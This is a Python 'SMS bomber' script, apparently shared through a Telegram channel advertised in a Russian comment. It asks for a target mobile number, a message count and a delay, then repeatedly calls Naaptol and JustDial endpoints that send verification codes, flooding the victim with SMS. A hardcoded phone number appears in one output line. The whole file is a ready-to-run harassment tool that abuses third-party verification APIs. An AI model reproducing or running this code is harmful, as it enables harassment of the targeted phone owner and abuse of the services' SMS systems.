#Бесплатные софты только тут - t.me/thiasoft

import urllib.request
import http.cookiejar
import platform
import os
import time
from colorama import init, Fore

try:
    raw_input
except NameError:
    raw_input = input

init()
def banner():
    if platform.system().lower() == "windows":
        os.system("cls")
    else:
        os.system("clear")
    print(Fore.YELLOW + """
  /$$$$$$  /$$      /$$  /$$$$$$        /$$$$$$$   /$$$$$$  /$$      /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$ 
 /$$__  $$| $$$    /$$$ /$$__  $$      | $$__  $$ /$$__  $$| $$$    /$$$| $$__  $$| $$_____/| $$__  $$
| $$  \__/| $$$$  /$$$$| $$  \__/      | $$  \ $$| $$  \ $$| $$$$  /$$$$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$ | $$ $$/$$ $$|  $$$$$$       | $$$$$$$ | $$  | $$| $$ $$/$$ $$| $$$$$$$ | $$$$$   | $$$$$$$/
 \____  $$| $$  $$$| $$ \____  $$      | $$__  $$| $$  | $$| $$  $$$| $$| $$__  $$| $$__/   | $$__  $$
 /$$  \ $$| $$\  $ | $$ /$$  \ $$      | $$  \ $$| $$  | $$| $$\  $ | $$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$/| $$ \/  | $$|  $$$$$$/      | $$$$$$$/|  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$$$$$$$| $$  | $$
 \______/ |__/     |__/ \______/       |_______/  \______/ |__/     |__/|_______/ |________/|__/  |__/
                                                                                                                                                                                                    
                                                                    //Powered By TeleCode Client//
""" + Fore.RESET)

def send(num, counter, slep, api_key, site):
    urls = {
        "Naaptol": "https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=",
        "JustDial": "https://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile="
    }
    hdr = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3','Accept-Encoding': 'none','Accept-Language': 'en-US,en;q=0.8','Connection': 'keep-alive'}
    
    if site in urls:
        result_url = urls[site] + num
        req = urllib.request.Request(result_url, headers=hdr)
        for x in range(counter):
            banner()
            print(Fore.GREEN + "Target Number          : 01531999473", num)
            print("Number of Message Sent : ", x+1)
            print("API Key Used           : ", api_key)
            print("API for               : ", site, Fore.RESET)
            page = urllib.request.urlopen(req)
            time.sleep(slep)
    else:
        print(Fore.RED + "Invalid site name!", Fore.RESET)

try:
    banner()
    number = raw_input("Enter mobileNumber: ")
    count = raw_input("Enter number of Message: ")
    throttle = raw_input("Enter time of sleep: ")
    
    #апи тута
    sites = ["Naaptol", "JustDial"]#сайты тута
    print("Available sites:", ", ".join(sites))
    site = raw_input("Enter site for API: ")
    
    api_key = raw_input("Enter API key: ")#дайдайдай
    send(number, int(count), int(throttle), api_key, site)
except Exception as e:
    print("Something is wrong please Re-run this script.")#пшол нах
